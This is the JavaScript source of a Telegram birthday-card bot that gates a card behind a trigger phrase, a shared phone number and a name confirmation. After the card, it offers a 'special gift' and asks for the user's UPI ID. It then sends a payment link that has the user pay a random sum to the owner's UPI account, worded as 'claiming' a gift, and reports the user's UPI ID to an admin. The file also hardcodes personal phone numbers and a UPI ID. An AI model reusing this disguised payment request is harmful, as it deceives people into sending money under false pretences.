import { Telegraf, Markup } from "telegraf";
import express from "express";
import fs from "fs";

// === Bot Configuration ===
// IMPORTANT: Set BOT_TOKEN in your hosting environment's variables.
const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) {
  console.error("❌ BOT_TOKEN not found! Set it in your environment variables.");
  process.exit(1);
}

// === CONSTANTS ===
const IMAGE_PATH = "Wishing Birthday.png";
const TRIGGER_MESSAGE = "10/10/2002";
const AUTHORIZED_NUMBERS = ["+918777072747", "+918777845713"];
const ADMIN_CHAT_ID = 1299129410; // Your Telegram User ID
const START_TIME = Date.now();
const OWNER_UPI_ID = "8777845713@upi"; // The UPI ID that will receive the funds

// === State Management Constants ===
const AWAITING_CONTACT = "awaiting_contact";
const AWAITING_UPI = "awaiting_upi";

// === Create bot instance ===
const bot = new Telegraf(TOKEN);
const userStates = {}; // user_id -> "awaiting_contact" | "awaiting_upi" | null

// === Helper to send typing indicator ===
async function sendTypingAction(ctx) {
    await ctx.replyWithChatAction('typing');
    // A short delay to make the typing indicator feel more natural
    await new Promise(r => setTimeout(r, 800));
}

// === Keep-Alive Server (for hosting platforms like Render) ===
const app = express();
app.get("/", (req, res) => res.send("✅ Bot server is alive and running!"));
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🌐 Keep-alive server running on port ${PORT}`));

// === Helper: Main Menu Buttons ===
function getMainMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("📜 Bot Info", "info"), Markup.button.callback("💬 Description", "description")],
    [Markup.button.callback("👤 Master", "master"), Markup.button.callback("⏱ Uptime", "uptime")],
    [Markup.button.callback("🌐 Master’s Socials", "socials")]
  ]);
}

// === /start Command ===
bot.start(async (ctx) => {
  await sendTypingAction(ctx);
  await ctx.reply("Hi! Send the secret word you just copied to get your card! ❤️❤️❤️");
});

// === Handle Text Messages (Includes UPI ID Input) ===
bot.on("text", async (ctx) => {
  const userId = ctx.from.id;
  const text = ctx.message.text.trim(); // Keep original casing for UPI ID handling
  const lowerText = text.toLowerCase();

  // 1. Awaiting contact
  if (userStates[userId] === AWAITING_CONTACT) {
    await sendTypingAction(ctx);
    await ctx.reply('Please use the "Share Contact" button to send your number.');
    return;
  }
  
  // 2. Awaiting UPI ID
  if (userStates[userId] === AWAITING_UPI) {
      await sendTypingAction(ctx);

      // Basic UPI ID validation (must contain '@' and be a single string)
      if (text.includes('@') && text.length > 5) {
          const userUpiId = text;
          const randomAmount = Math.floor(Math.random() * 500) + 1; // Random amount from 1 to 500
          const transactionNote = `BirthdayGiftFor${userId}`;

          // Generate UPI Deep Link for payment from user to owner's ID
          // pa: Payee Address (your ID), pn: Payee Name, am: Amount
          const upiLink = `upi://pay?pa=${OWNER_UPI_ID}&pn=Pratik%20Roy&mc=0000&tid=&am=${randomAmount}.00&cu=INR&tn=${transactionNote}`;

          // Clear state
          delete userStates[userId];

          const paymentButton = Markup.inlineKeyboard([
              Markup.button.url(`✨ Claim Your Gift: Pay ₹${randomAmount}`, upiLink)
          ]);
          
          // Send payment request
          await ctx.replyWithMarkdown(
              `_Analyzing your unique request..._\n\n*Great news!* Your special gift is a token of appreciation worth ₹${randomAmount}! 🎁\n\nTo officially register this unique gift experience to your account, please tap the button and complete the token transaction below.\n\n_Note: This transaction will be initiated from your UPI app, directed to Pratik Roy, to finalize the gift claim._`,
              { reply_markup: paymentButton, parse_mode: 'Markdown' }
          );

          // Notify admin (optional but good for tracking)
          await ctx.telegram.sendMessage(
             ADMIN_CHAT_ID,
             `🎁 Gift flow triggered for user @${ctx.from.username} (ID: ${userId}). Amount: ₹${randomAmount}. User UPI: ${userUpiId}`
          );

      } else {
          await ctx.reply("That doesn't look like a valid UPI ID. Please try again (e.g., `name@bank`):");
      }
      return;
  }

  // 3. Trigger message flow
  if (lowerText === TRIGGER_MESSAGE.toLowerCase()) {
    await sendTypingAction(ctx);
    await ctx.reply("🔍 Checking database to find matches...");
    await new Promise((r) => setTimeout(r, 1500));

    await sendTypingAction(ctx);
    await ctx.reply("⌛ Waiting to receive response...");
    await new Promise((r) => setTimeout(r, 1500));

    const contactButton = Markup.keyboard([[Markup.button.contactRequest("Share Contact")]]).oneTime().resize();
    await sendTypingAction(ctx);
    await ctx.reply("Please share your phone number to continue:", contactButton);
    userStates[userId] = AWAITING_CONTACT;
    return;
  }

  // 4. Non-trigger message: show warning + main menu buttons
  await sendTypingAction(ctx);
  await ctx.reply("I only respond to the specific trigger message.");
  
  await sendTypingAction(ctx);
  await ctx.reply("You can check out more details below 👇", getMainMenu());
});

// === Handle Contact Messages ===
bot.on("contact", async (ctx) => {
  const userId = ctx.from.id;
  const contact = ctx.message.contact;

  if (contact) {
    // Once contact is shared, they are no longer awaiting it.
    delete userStates[userId];
    // Remove all custom keyboards
    await ctx.reply("Thanks!", Markup.removeKeyboard());
    
    const userNumber = contact.phone_number.replace("+", "");
    const authorizedNormalized = AUTHORIZED_NUMBERS.map((n) => n.replace("+", ""));

    if (authorizedNormalized.includes(userNumber)) {
      await sendTypingAction(ctx);
      await ctx.reply("📞 Checking back with your number...");
      await new Promise((r) => setTimeout(r, 1500));
      
      await sendTypingAction(ctx);
      await ctx.reply("🔐 Authenticating...");
      await new Promise((r) => setTimeout(r, 1500));
      
      // Confirmation with Buttons
      const confirmationKeyboard = Markup.inlineKeyboard([
          Markup.button.callback("Yes, that's me!", "confirm_yes"),
          Markup.button.callback("No, that's not me", "confirm_no")
      ]);

      await sendTypingAction(ctx);
      await ctx.replyWithMarkdown(
        'As per matches found in database, are you *Pratik Roy*?',
        confirmationKeyboard
      );
    } else {
      await sendTypingAction(ctx);
      await ctx.reply("🚫 Sorry! You're not authorized to perform this action.");
    }
  }
});


// === Handle "Yes" Confirmation Button ===
bot.action('confirm_yes', async (ctx) => {
    // Edit the original message to show confirmation and remove buttons
    await ctx.editMessageText("✅ Identity confirmed! Preparing your card... 💫");

    // --- START: Sticker Sequence ---
    await sendTypingAction(ctx);
    await ctx.replyWithSticker('CAACAgEAAxkBAAEPieBo5pIfbsOvjPZ6aGZJzuszgj_RMwACMAQAAhyYKEevQOWk5-70BjYE');

    await new Promise((r) => setTimeout(r, 3000));

    await sendTypingAction(ctx);
    await ctx.replyWithSticker('CAACAgEAAxkBAAEPf8Zo4QXOaaTjfwVq2EdaYp2t0By4UAAC-gEAAoyxIER4c3iI53gcxDYE');
    
    await new Promise((r) => setTimeout(r, 1500));
    // --- END: Sticker Sequence ---

    await sendTypingAction(ctx);
    if (fs.existsSync(IMAGE_PATH)) {
      await ctx.replyWithPhoto({ source: IMAGE_PATH }, { caption: "🎁 Your card is ready — Tap to reveal!", has_spoiler: true });
    } else {
      await ctx.reply("😔 Sorry, the birthday card image is missing on the server.");
      console.error(`Error: Image not found at ${IMAGE_PATH}`);
    }

    const ratingKeyboard = Markup.inlineKeyboard([
      [
        Markup.button.callback("1 ⭐", "rating_1"),
        Markup.button.callback("2 ⭐", "rating_2"),
        Markup.button.callback("3 ⭐", "rating_3"),
        Markup.button.callback("4 ⭐", "rating_4"),
        Markup.button.callback("5 ⭐", "rating_5"),
      ],
    ]);
    
    await sendTypingAction(ctx);
    await ctx.reply("Please rate your experience:", ratingKeyboard);
});

// === Handle "No" Confirmation Button ===
bot.action('confirm_no', async (ctx) => {
    await ctx.editMessageText("🚫 Sorry! You're not authorized to perform this action.");
});


// === Handle Ratings (Now leads to Gift Question) ===
bot.action(/^rating_/, async (ctx) => {
  const rating = ctx.match.input.split("_")[1];
  const username = ctx.from.username || ctx.from.first_name;

  await ctx.editMessageText(`Thank you for your rating of ${rating} ⭐!`);

  // No typing indicator needed for sending a message to the admin
  await ctx.telegram.sendMessage(
    ADMIN_CHAT_ID,
    `User @${username} (ID: ${ctx.chat.id}) rated ${rating} ⭐`
  );
  
  // --- NEW: Ask about the next gift ---
  const giftKeyboard = Markup.inlineKeyboard([
      Markup.button.callback("Yes, please!", "ask_gift_yes"),
      Markup.button.callback("No, thank you.", "ask_gift_no")
  ]);

  await sendTypingAction(ctx);
  await ctx.reply("Before you go, would you like to check out another special gift?", giftKeyboard);
});

// === Handle "Yes, please!" to Gift Question (Awaiting UPI ID) ===
bot.action('ask_gift_yes', async (ctx) => {
    const userId = ctx.from.id;
    await ctx.editMessageText("Great! To proceed with your special gift, please send your valid UPI ID (e.g., `user@bank`):");
    userStates[userId] = AWAITING_UPI;
});

// === Handle "No, thank you." to Gift Question ===
bot.action('ask_gift_no', async (ctx) => {
    await ctx.editMessageText("No worries! Thanks again for celebrating with me. Have a wonderful day! ❤️");
    delete userStates[ctx.from.id];
});


// === Info & Socials Buttons ===
// Typing indicators are not needed for editMessageText as it modifies an existing message
bot.action(["info","description","master","uptime","socials","back_to_menu"], async (ctx) => {
  const data = ctx.match.input;
  const uptimeSeconds = Math.floor((Date.now() - START_TIME) / 1000);
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = uptimeSeconds % 60;
  const uptimeStr = `${hours}h ${minutes}m ${seconds}s`;

  const backButton = Markup.inlineKeyboard([[Markup.button.callback("⬅️ Back","back_to_menu")]]);

  switch(data){
    case "info":
      await ctx.editMessageText(
        "🤖 *Bot Info*\n\nThis bot was specially made for sending personalized *birthday wish cards* to that person who deserves a surprise 🎉🎂.",
        { parse_mode:"Markdown", ...backButton }
      );
      break;

    case "description":
      await ctx.editMessageText(
        "💬 *Description*\n\nA fun, interactive bot built to deliver surprise birthday wishes with love 💫",
        { parse_mode:"Markdown", ...backButton }
      );
      break;

    case "master":
      await ctx.editMessageText(
        "👤 *Master*\n\nMade by **Shovith (Sid)** ✨",
        { parse_mode:"Markdown", ...backButton }
      );
      break;

    case "uptime":
      await ctx.editMessageText(
        `⏱ *Uptime*\n\nYou've been using this bot for past \`${uptimeStr}\`.`,
        { parse_mode:"Markdown", ...backButton }
      );
      break;

    case "socials":
      await ctx.editMessageText(
        "*🌐 Master’s Socials*\n\nChoose a platform to connect:",
        {
          parse_mode:"Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.url("WhatsApp", "https://wa.me/918777845713")],
            [Markup.button.url("Telegram", "https://t.me/X_o_x_o_002")],
            [Markup.button.url("Website", "https://hawkay002.github.io/Connect/")],
            [Markup.button.callback("⬅️ Back", "back_to_menu")]
          ])
        }
      );
      break;

    case "back_to_menu":
      await ctx.editMessageText("You can check out more details below 👇", getMainMenu());
      break;
  }
});

// === Start Bot ===
bot.launch();
console.log("🤖 Bot is running...");

// Graceful shutdown
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));

